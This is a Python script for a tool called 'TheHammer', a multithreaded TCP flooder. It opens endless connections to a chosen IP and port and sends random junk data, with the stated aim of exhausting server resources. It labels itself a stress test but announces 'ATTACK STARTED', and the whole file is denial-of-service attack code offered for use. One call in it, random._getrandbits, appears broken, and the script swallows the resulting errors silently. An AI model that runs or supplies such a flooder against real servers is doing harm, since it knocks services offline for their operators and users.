import socket
import threading
import random
import sys

class TheHammer:
    def __init__(self, target_ip, target_port=80):
        self.target_ip = target_ip
        self.target_port = target_port
        self.running = False
        self.attack_count = 0

    def attack_socket(self):
        """
        Creates a continuous stream of TCP connections to exhaust server resources.
        """
        while self.running:
            try:
                # Create a TCP socket
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2) # Short timeout to rotate connections faster
                s.connect((self.target_ip, self.target_port))
                
                # Send a junk payload to keep the connection open/busy
                payload = random._getrandbits(1024) # Generate random junk data
                s.send(str.encode(str(payload))) 
                
                self.attack_count += 1
                s.close()
            except socket.error:
                # Port might be closed or server is already crashing
                pass
            except Exception:
                pass

    def run(self, thread_count=100):
        """
        Launches the stress test with a specified number of threads.
        """
        print(f"\n[!] THE HAMMER: INITIALIZING RESOURCE STRESS TEST")
        print(f"[*] Target IP: {self.target_ip} | Port: {self.target_port}")
        print(f"[*] Thread Count: {thread_count}")
        print("-" * 60)
        
        self.running = True
        threads = []

        # Launching the hammer
        try:
            for i in range(thread_count):
                t = threading.Thread(target=self.attack_socket)
                t.daemon = True # Ensure threads close when main program exits
                threads.append(t)
                t.start()
            
            print("[+] ATTACK STARTED... Press Ctrl+C to stop the Hammer.")
            
            while self.running:
                # Print current attack stats every second
                # Note: attack_count is shared across threads, so it grows rapidly
                print(f"\r[+] Packets/Connections Sent: {self.attack_count}", end="")
                # Use a small sleep to prevent the print loop from hogging CPU
                import time
                time.sleep(1)
                
        except KeyboardInterrupt:
            self.running = False
            print("\n" + "-" * 60)
            print(f"[+] HAMMER STOPPED. Total connections attempted: {self.attack_count}")
            print("-" * 60)

# Example for testing:
# hammer = TheHammer("127.0.0.1", 80)
# hammer.run(thread_count=500)